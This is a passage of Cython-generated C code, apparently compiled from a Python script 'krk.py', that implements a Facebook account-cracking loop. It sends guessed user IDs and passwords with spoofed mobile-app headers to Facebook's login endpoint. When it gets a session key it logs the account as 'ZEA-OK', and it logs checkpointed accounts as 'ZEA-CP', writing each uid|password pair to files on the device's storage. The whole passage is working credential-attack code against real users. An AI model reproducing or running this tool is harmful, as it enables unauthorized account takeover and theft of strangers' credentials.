        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_X_FB_Friendly_Name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 637, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_X_FB_Connection_Type, __pyx_n_s_unknown) < 0) __PYX_ERR(0, 637, __pyx_L3_error)

        /* "krk.py":640
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Type':'unknown',
 *                                 'User-Agent':ua,             # <<<<<<<<<<<<<<
 *                                 'Accept-Encoding':'gzip, deflate',
 *                                 'Content-Type': 'application/x-www-form-urlencoded',
 */
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_User_Agent, __pyx_v_ua) < 0) __PYX_ERR(0, 637, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_Accept_Encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 637, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_Content_Type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 637, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_X_FB_HTTP_Engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 637, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_2));
        __pyx_t_2 = 0;

        /* "krk.py":645
 *                                 'X-FB-HTTP-Engine': 'Liger'
 *                                 }
 *                         url = 'https://b-graph.facebook.com/auth/login'             # <<<<<<<<<<<<<<
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 */
        __Pyx_INCREF(__pyx_kp_s_https_b_graph_facebook_com_auth);
        __Pyx_XDECREF_SET(__pyx_v_url, __pyx_kp_s_https_b_graph_facebook_com_auth);

        /* "krk.py":646
 *                                 }
 *                         url = 'https://b-graph.facebook.com/auth/login'
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'             # <<<<<<<<<<<<<<
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 */
        __pyx_t_2 = __Pyx_PyStr_Concat(__pyx_kp_s_Login_approval, __pyx_kp_s_s_are_on); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 646, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_4 = __Pyx_PyStr_ConcatInPlace(__pyx_t_2, __pyx_kp_s_Expect_an_SMS); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 646, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyStr_ConcatInPlace(__pyx_t_4, __pyx_kp_s_shortly_with); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 646, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyStr_ConcatInPlace(__pyx_t_2, __pyx_kp_s_a_code_to_use); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 646, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyStr_ConcatInPlace(__pyx_t_4, __pyx_kp_s_for_log_in); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 646, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_twf, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":647
 *                         url = 'https://b-graph.facebook.com/auth/login'
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()             # <<<<<<<<<<<<<<
 *                         if 'session_key' in po:
 *                                 try:
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
        __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 647, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 647, __pyx_L3_error)
        __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_4, __pyx_t_3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_json); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        __pyx_t_14 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_14)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_14);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_14, };
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 647, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_po, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":648
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         uid = po['uid']
 */
        __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_v_po, Py_EQ)); if (unlikely((__pyx_t_15 < 0))) __PYX_ERR(0, 648, __pyx_L3_error)
        if (__pyx_t_15) {

          /* "krk.py":649
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         uid = po['uid']
 *                                 except:
 */
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
            __Pyx_XGOTREF(__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_17);
            __Pyx_XGOTREF(__pyx_t_18);
            /*try:*/ {

              /* "krk.py":650
 *                         if 'session_key' in po:
 *                                 try:
 *                                         uid = po['uid']             # <<<<<<<<<<<<<<
 *                                 except:
 *                                         uid = ids
 */
              __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_uid); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 650, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_2);
              __pyx_t_2 = 0;

              /* "krk.py":649
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         uid = po['uid']
 *                                 except:
 */
            }
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            goto __pyx_L19_try_end;
            __pyx_L12_error:;
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":651
 *                                 try:
 *                                         uid = po['uid']
 *                                 except:             # <<<<<<<<<<<<<<
 *                                         uid = ids
 *                                 if str(uid) in oks:
 */
            /*except:*/ {
              __Pyx_AddTraceback("krk.rndm", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_3, &__pyx_t_14) < 0) __PYX_ERR(0, 651, __pyx_L14_except_error)
              __Pyx_XGOTREF(__pyx_t_2);
              __Pyx_XGOTREF(__pyx_t_3);
              __Pyx_XGOTREF(__pyx_t_14);

              /* "krk.py":652
 *                                         uid = po['uid']
 *                                 except:
 *                                         uid = ids             # <<<<<<<<<<<<<<
 *                                 if str(uid) in oks:
 *                                         break
 */
              __Pyx_INCREF(__pyx_v_ids);
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_v_ids);
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              goto __pyx_L13_exception_handled;
            }

            /* "krk.py":649
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         uid = po['uid']
 *                                 except:
 */
            __pyx_L14_except_error:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            goto __pyx_L3_error;
            __pyx_L13_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            __pyx_L19_try_end:;
          }

          /* "krk.py":653
 *                                 except:
 *                                         uid = ids
 *                                 if str(uid) in oks:             # <<<<<<<<<<<<<<
 *                                         break
 *                                 else:
 */
          __pyx_t_14 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 653, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_oks); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 653, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_t_14, __pyx_t_3, Py_EQ)); if (unlikely((__pyx_t_15 < 0))) __PYX_ERR(0, 653, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (__pyx_t_15) {

            /* "krk.py":654
 *                                         uid = ids
 *                                 if str(uid) in oks:
 *                                         break             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 */
            goto __pyx_L10_break;

            /* "krk.py":653
 *                                 except:
 *                                         uid = ids
 *                                 if str(uid) in oks:             # <<<<<<<<<<<<<<
 *                                         break
 *                                 else:
 */
          }

          /* "krk.py":656
 *                                         break
 *                                 else:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+str(uid)+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/ZEA-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
 *                                         oks.append(str(uid))
 */
          /*else*/ {
            __pyx_t_3 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_14 = PyNumber_Add(__pyx_kp_s_1_32m_ZEA_OK, __pyx_t_3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 656, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = PyNumber_Add(__pyx_t_14, __pyx_kp_s__68); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __pyx_t_14 = PyNumber_Add(__pyx_t_3, __pyx_v_pas); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 656, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = PyNumber_Add(__pyx_t_14, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 656, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "krk.py":657
 *                                 else:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         oks.append(str(uid))
 *                                         break
 */
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__80, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 657, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 657, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 657, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_kp_s__25); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = PyNumber_Add(__pyx_t_4, __pyx_v_pas); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 657, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_kp_s__63); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_4};
              __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 657, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            }
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "krk.py":658
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
 *                                         oks.append(str(uid))             # <<<<<<<<<<<<<<
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_oks); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 658, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_2 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 658, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_19 = __Pyx_PyObject_Append(__pyx_t_14, __pyx_t_2); if (unlikely(__pyx_t_19 == ((int)-1))) __PYX_ERR(0, 658, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            /* "krk.py":659
 *                                         open('/sdcard/ZEA-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
 *                                         oks.append(str(uid))
 *                                         break             # <<<<<<<<<<<<<<
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                 try:
 */
            goto __pyx_L10_break;
          }

          /* "krk.py":648
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         uid = po['uid']
 */
        }

        /* "krk.py":660
 *                                         oks.append(str(uid))
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         uid = po['error']['error_data']['uid']
 */
        __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_error); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 660, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_message); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 660, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_14, Py_EQ)); if (unlikely((__pyx_t_15 < 0))) __PYX_ERR(0, 660, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        if (__pyx_t_15) {

          /* "krk.py":661
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         uid = po['error']['error_data']['uid']
 *                                 except:
 */
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_18, &__pyx_t_17, &__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_18);
            __Pyx_XGOTREF(__pyx_t_17);
            __Pyx_XGOTREF(__pyx_t_16);
            /*try:*/ {

              /* "krk.py":662
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                 try:
 *                                         uid = po['error']['error_data']['uid']             # <<<<<<<<<<<<<<
 *                                 except:
 *                                         uid = ids
 */
              __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_error); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 662, __pyx_L23_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_14, __pyx_n_s_error_data); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 662, __pyx_L23_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
              __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_uid); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 662, __pyx_L23_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_14);
              __pyx_t_14 = 0;

              /* "krk.py":661
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         uid = po['error']['error_data']['uid']
 *                                 except:
 */
            }
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            goto __pyx_L30_try_end;
            __pyx_L23_error:;
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":663
 *                                 try:
 *                                         uid = po['error']['error_data']['uid']
 *                                 except:             # <<<<<<<<<<<<<<
 *                                         uid = ids
 *                                 if uid in oks:pass
 */
            /*except:*/ {
              __Pyx_AddTraceback("krk.rndm", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_14, &__pyx_t_2, &__pyx_t_4) < 0) __PYX_ERR(0, 663, __pyx_L25_except_error)
              __Pyx_XGOTREF(__pyx_t_14);
              __Pyx_XGOTREF(__pyx_t_2);
              __Pyx_XGOTREF(__pyx_t_4);

              /* "krk.py":664
 *                                         uid = po['error']['error_data']['uid']
 *                                 except:
 *                                         uid = ids             # <<<<<<<<<<<<<<
 *                                 if uid in oks:pass
 *                                 else:
 */
              __Pyx_INCREF(__pyx_v_ids);
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_v_ids);
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              goto __pyx_L24_exception_handled;
            }

            /* "krk.py":661
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         uid = po['error']['error_data']['uid']
 *                                 except:
 */
            __pyx_L25_except_error:;
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_17, __pyx_t_16);
            goto __pyx_L3_error;
            __pyx_L24_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_17, __pyx_t_16);
            __pyx_L30_try_end:;
          }

          /* "krk.py":665
 *                                 except:
 *                                         uid = ids
 *                                 if uid in oks:pass             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_oks); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_v_uid, __pyx_t_4, Py_EQ)); if (unlikely((__pyx_t_15 < 0))) __PYX_ERR(0, 665, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (__pyx_t_15) {
            goto __pyx_L33;
          }

          /* "krk.py":667
 *                                 if uid in oks:pass
 *                                 else:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+str(uid)+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/ZEA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
 *                                         cps.append(str(ids))
 */
          /*else*/ {
            __pyx_t_4 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 667, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_2 = PyNumber_Add(__pyx_kp_s_1_36m_ZEA_CP, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 667, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__68); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 667, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_pas); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 667, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 667, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 667, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            /* "krk.py":668
 *                                 else:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         cps.append(str(ids))
 *                                         break
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__81, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 668, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_3 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__25); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 668, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
